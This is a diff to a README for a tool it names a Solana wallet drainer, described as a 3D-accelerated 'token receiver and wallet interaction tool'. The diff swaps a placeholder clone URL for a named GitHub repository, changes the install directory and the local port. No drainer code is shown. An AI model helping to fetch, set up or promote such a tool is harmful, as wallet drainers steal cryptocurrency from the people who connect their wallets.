@@ -37,13 +37,13 @@ A high-end, 3D-accelerated Solana token receiver and wallet interaction tool. Fe
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/yourusername/wallet-drainer.git
+git clone https://github.com/HIT0xexcute/WALLET_SOLANA_DRAINER.git
 cd wallet-drainer
 ```
 
 2. Install dependencies:
 ```bash
-cd solana_app
+cd WALLET_SOLANA_DRAINER
 npm install
 ```
 
@@ -51,7 +51,7 @@ npm install
 ```bash
 npm start
 ```
-The application will run on `http://localhost:3000`.
+The application will run on `http://localhost:8080`.
 
 ## Configuration
 
